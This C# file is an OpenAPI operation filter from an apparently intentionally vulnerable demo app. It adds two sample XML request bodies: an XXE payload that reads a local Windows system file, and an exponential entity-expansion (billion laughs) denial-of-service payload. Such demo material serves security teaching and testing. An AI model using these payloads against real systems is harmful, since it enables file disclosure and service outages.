using Microsoft.OpenApi.Any;
using Microsoft.OpenApi.Models;
using Swashbuckle.AspNetCore.SwaggerGen;
using System;
using System.Collections.Generic;
using System.Linq;

namespace VulnerableDeserialization
{
    public class SwaggerXMLOperationFilter : IOperationFilter
    {
        public void Apply(OpenApiOperation operation, OperationFilterContext context)
        {
            var swaggerXMLAttribute = context.MethodInfo.GetCustomAttributes(true)
               .SingleOrDefault((attribute) => attribute is SwaggerXMLAttribute) as SwaggerXMLAttribute;
            if (swaggerXMLAttribute != null)
            {
                operation.RequestBody = new OpenApiRequestBody();
                operation.RequestBody.Content.Add(swaggerXMLAttribute.MediaType, new OpenApiMediaType()
                {
                    Schema = new OpenApiSchema()
                    {
                        Type = "string"
                    },
                    Examples = new Dictionary<string, OpenApiExample>()
                    {
                        { "Custom XmlResolver",
                            new OpenApiExample() {
                              Value = new OpenApiString("<?xml version = \"1.0\" ?>" + Environment.NewLine +
                              "<!DOCTYPE foo[<!ELEMENT foo ANY>" + Environment.NewLine +
                              "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>" + Environment.NewLine +
                              "<foo>&xxe;</foo>")
                            }
                        },
                         { "DoS with DTD Processing",
                            new OpenApiExample() {
                              Value = new OpenApiString("<?xml version = \"1.0\" ?>" + Environment.NewLine +
                                    "<!DOCTYPE data[" + Environment.NewLine +
                                    "<!ENTITY a0 \"I will never set DtdProcessing setting to Parse\">" + Environment.NewLine +
                                    "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">" + Environment.NewLine +
                                    "<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">"+ Environment.NewLine +
                                    "<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">"+ Environment.NewLine +
                                    "<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">"+ Environment.NewLine +
                                    "]>" + Environment.NewLine +
                                    "<data>&a4;</data>")
                            }
                        }
                    }

                });
            }
        }
    }
}
